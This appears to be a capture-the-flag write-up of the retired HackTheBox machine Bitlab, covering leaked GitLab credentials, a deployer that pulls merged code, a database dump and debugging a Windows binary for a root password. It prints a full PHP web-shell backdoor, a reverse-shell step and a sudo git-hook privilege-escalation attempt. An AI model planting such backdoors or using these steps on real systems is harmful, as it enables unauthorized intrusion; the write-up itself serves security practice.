This is a writeup about a retired HacktheBox machine:
[Bitlab](https://www.hackthebox.eu/home/machines/profile/207).
This box is rated as a medium box. It implies a gitlab, a user, some
enumeration, a PostgreSQL database, some pain with a b64 password and some basic
reverse engineering on a Windows binary.

*If you just want to play with the binary: it is available in the
"RemoteConnection.exe" part.*

# Getting user

## Recon

Let us start as always by a `nmap` scan. Only the ports 22 (SSH) and 80 (HTTP)
are open:

    :::text

    80/tcp open  http

    # Nmap done at Mon Nov 25 13:26:14 2019 -- 1 IP address (1 host up) scanned in 145.18 seconds

## Web

The home page is a [gitlab](https://about.gitlab.com/) home page.

We run a [dirb](https://tools.kali.org/web-applications/dirb) against the home
page and discover a few pages and directory.

## Gitlab unauthenticated

The `profile` URL give us access to some developer ugly profile:

![Clave profile](/media/2020.01/bitlab_5.png)

When looking at the main page we can see an help link linking to a directory
listing page linking to a bookmarks page with a few bookmarks.

![help link](/media/2020.01/bitlab_1.png)
![Directory listing](/media/2020.01/bitlab_2.png)
![Last bookmark](/media/2020.01/bitlab_3.png)

The last link as the following value.

  :::text
  javascript:(function(){%20var%20_0x4b18=["\x76\x61\x6C\x75\x65","\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x6C\x61\x76\x65","\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64","\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]]=%20_0x4b18[3];document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5];%20})()

We use an [online JavaScript Deobfuscator and Unpacker](https://lelinhtinh.github.io/de4js/)
to get the link "true" value:

    :::text
    javascript: (function () {
        % 20
        var % 20 _0x4b18 = ["value", "user_login", "getElementById", "clave", "user_password", "11des0081x"];
        document[_0x4b18[2]](_0x4b18[1])[_0x4b18[0]] = % 20 _0x4b18[3];
        document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]] = % 20 _0x4b18[5]; % 20
    })()

The credentials "clave" and "11des0081x" allow us to connect to the gitlab. We
have access to two projects owned by the "administrator" user: "Profile" and
"Deployer".

![Connected user](/media/2020.01/bitlab_4.png)

## Gitlab authenticated

The first project is the developer profile seen earlier. The second project is
the code use to deploy the first project using the following PHP syntax:

    :::PHP
    if ($repo=='Profile' && $branch=='master' && $event=='merge_request' && $state=='merged') {
        echo shell_exec('cd ../profile/; sudo git pull'),"\n";
    }

We can add a PHP simple reverse shell (the one in
`/usr/share/webshells/php/simple-backdoor.php` on Kali), make a pull request and
merge it from the gitlab interface.

    :::PHP
    <!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

    <?php

    if(isset($_REQUEST['cmd'])){
            echo "<pre>";
            $cmd = ($_REQUEST['cmd']);
            system($cmd);
            echo "</pre>";
            die;
    }

    ?>

    Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

    <!--    http://michaeldaw.org   2006    -->

![Adding some PHP file](/media/2020.01/bitlab_6.png)

We then use the "Deployer" by accessing the `http://10.10.10.114/deployer/` URL
and we can access our webshell with the `http://10.10.10.114/profile/cmd2.php`
URL.

We can also deploy a reverse shell (from
`/usr/share/webshell/php/reverse-shell.php` for instance) and  get a shell as `www-data`
We can use `python -c 'import pty; pty.spawn("/bin/sh")'` in order to get a
interactive shell. We start enumerating the box and something interesting come
out: Our user as a `sudo` permission with no password for `/usr/bin/git pull`.

    :::text
    $ sudo -l
    sudo -l
    Matching Defaults entries for www-data on bitlab:
        env_reset, exempt_group=sudo, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User www-data may run the following commands on bitlab:
        (root) NOPASSWD: /usr/bin/git pull

My first idea was to try `sudo /usr/bin/git pull --help` to get the pager as
root but that doesn't work. The second idea was to create a new git repository
and play with the post-merge hooks but I didn't had the right to create a new
git project. It seems like a dead end.

    :::text
    $ cd /var/www/html
    $ ls
    deployer
    help
    index.html
    profile
    $ cp -r profile /tmp/poi
    $ cd /tmp/poi
    $ cd .git/hooks/
    $ echo '#!/bin/bash' >> post-merge
    $ echo 'cat /root/root.txt' >> post-merge
    $ chmod +x post-merge
    $ sudo /usr/bin/git pull
    fatal: this operation must be run in a work tree


## Postgresql

By exploring more the gitlab we can found a "snippet" name "Postgresql" containing
the base of PHP script to connect to the database.

    :::PHP
    <?php
    $db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
    $result = pg_query($db_connection, "SELECT * FROM profiles");

We complete the script to display the database content.

    :::PHP
    <?php
    $db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
    $result = pg_query($db_connection, "SELECT * FROM profiles");
    $numrows = pg_numrows($result);
    for($i = 0; $i < $numrows; $i++)
    {
        $row = pg_fetch_array($result, $i);
        echo "id: " . $row[0];
        echo "user: " . $row[1];
        echo "pass: " . $row[2];
    }
    ?>

We then deploy it and execute it. The content of the database is
`id: 1user: clavepass: c3NoLXN0cjBuZy1wQHNz==`
Decoding the base64 password give an error as the padding is wrong.

```
echo -ne 'c3NoLXN0cjBuZy1wQHNz' | base64 -d
ssh-str0ng-p@ss
```

The decoded password do not work. But using the base64 password is working
(**WHY WOULD YOU DO THAT?!** this can be a complete brainfuck). We
can then connect to the box as clave using SSH and get the user flag.

    :::text
    ssh clave@10.10.10.114
    clave@10.10.10.114's password:
    Last login: Tue Nov 26 07:17:40 2019 from 10.10.15.35
    clave@bitlab:~$ ls
    RemoteConnection.exe  user.txt
    clave@bitlab:~$ cat user.txt
    1e3fd8<redacted>

# Getting root

## RemoteConnection.exe

If you just want to work on the binary, it is available
[here](/media/2020.01/RemoteConnection.exe).

A `RemoteConnection.exe` binary is available in `clave`'s home folder.
We copy it on our local system. It effectively a 32 bits Windows binary.

    :::text
    file RemoteConnection.exe
    RemoteConnection.exe: PE32 executable (console) Intel 80386, for MS Windows

We can run `strings` in order to find an hard coded password but this is not the
case here.

    :::text
    strings RemoteConnection.exe 
    !This program cannot be run in DOS mode.
    Rich
    .text
    `.rdata
    @.data
    .rsrc

    <SNIP>

We boot a Windows Box (That is the first time that I boot a Windows box for a
HTB challenge) and run the binary in it. We got a message `Access Denied !!`

    :::text
    >RemoteConnection.exe 10.10.10.114
    Access Denied !!

## x64dbg

We load the binary in [x64dbg](https://x64dbg.com/).
We run to user code (<ALT>+<F9>). Then we take a look at the strings. It seems
that our binary use putty to establish a remote SSH connection.

![Strings in the binary](/media/2020.01/bitlab_8.png)

We put a breakpoint (<F2> on the `Access Denied !!` string).

![Breaking on "Access Denied"](/media/2020.01/bitlab_9.png)

And we execute the program (it will automatically stop at our breakpoint). We
can see that we got the options for putty:
`005EF708  02533678  "-ssh root@gitlab.htb -pw \"Qf7]8YSV.wDNF*[7d?j&eD4^\"" `.
We directly use the password to connect as root on the box and get the flag.

![The putty options at our breakpoint](/media/2020.01/bitlab_10.png)

root@kalili:~# ssh root@10.10.10.114
root@10.10.10.114's password:
Last login: Tue Nov 26 10:41:25 2019 from 10.10.15.142
root@bitlab:~# cat /root/root.txt

# Wrapping up

This box was interesting. The base64 password was a pain but still the user part
was quit realist as a lot of companies have some code versioning and CI tools
(gitlab, gogs, jenkins) the root part
was interesting at it implies some basic reverse engineering.
